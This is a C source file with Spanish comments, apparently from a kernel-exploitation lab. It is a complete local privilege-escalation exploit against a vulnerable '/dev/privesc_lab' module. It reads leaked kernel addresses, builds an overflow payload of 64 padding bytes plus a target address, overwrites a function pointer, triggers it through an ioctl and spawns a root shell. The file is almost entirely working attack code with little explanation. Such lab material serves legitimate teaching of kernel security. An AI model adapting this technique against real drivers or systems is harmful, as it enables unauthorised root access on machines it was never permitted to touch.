#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>

#include "../privesc/privesc_ioctl.h"

#define DEVICE_PATH "/dev/privesc_lab"
#define BUF_SIZE 64

int main(void)
{
    int fd;
    char info[128];
    ssize_t r;

    /*
     * Paso 1: abrir el dispositivo vulnerable.
     */
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    /*
     * Paso 2: leer la información filtrada por el módulo.
     */
    r = read(fd, info, sizeof(info) - 1);
    if (r <= 0) {
        perror("read");
        close(fd);
        return 1;
    }

    info[r] = '\0';

    printf("Información recibida del módulo:\n%s\n", info);

    /*
     * Paso 3: parsear las direcciones.
     */
    unsigned long handler_addr = 0;
    unsigned long win_addr = 0;

    int parsed;

    parsed = sscanf(info,
                    "handler=%lx win=%lx",
                    &handler_addr,
                    &win_addr);

    if (parsed != 2) {
        fprintf(stderr, "Formato inesperado\n");
        close(fd);
        return 1;
    }

    if (handler_addr == 0 || win_addr == 0) {
        fprintf(stderr, "No se pudieron obtener las direcciones\n");
        close(fd);
        return 1;
    }

    printf("handler=0x%lx\n", handler_addr);
    printf("win=0x%lx\n", win_addr);

    /*
     * Paso 4: construir el payload.
     *
     * 64 bytes de relleno + 8 bytes de dirección.
     */
    char payload[BUF_SIZE + sizeof(uint64_t)];

    memset(payload, 'A', BUF_SIZE);

    uint64_t target;
    target = (uint64_t)win_addr;

    memcpy(payload + BUF_SIZE, &target, sizeof(target));

    /*
     * Paso 5: escribir el payload para sobrescribir handler.
     */
    ssize_t w;

    w = write(fd, payload, sizeof(payload));
    if (w != (ssize_t)sizeof(payload)) {
        perror("write");
        close(fd);
        return 1;
    }

    printf("Payload enviado: %zu bytes\n", sizeof(payload));

    
    if (ioctl(fd, PRIVESC_CALL) == -1) {
        perror("ioctl");
        close(fd);
        return 1;
    }

    printf("PRIVESC_CALL ejecutado.\n");

    close(fd);

    /*
     * Paso 7: verificar si el exploit funcionó.
     *
     * getuid() devuelve el UID real del proceso.
     * Si es 0, somos root.
     */
    printf("UID actual: %d\n", getuid());

    if (getuid() == 0) {
        printf("¡SOMOS ROOT!\n");
        printf("Abriendo shell root...\n");
        system("/bin/bash");
    } else {
        printf("Exploit falló. UID=%d\n", getuid());
    }

    return 0;
}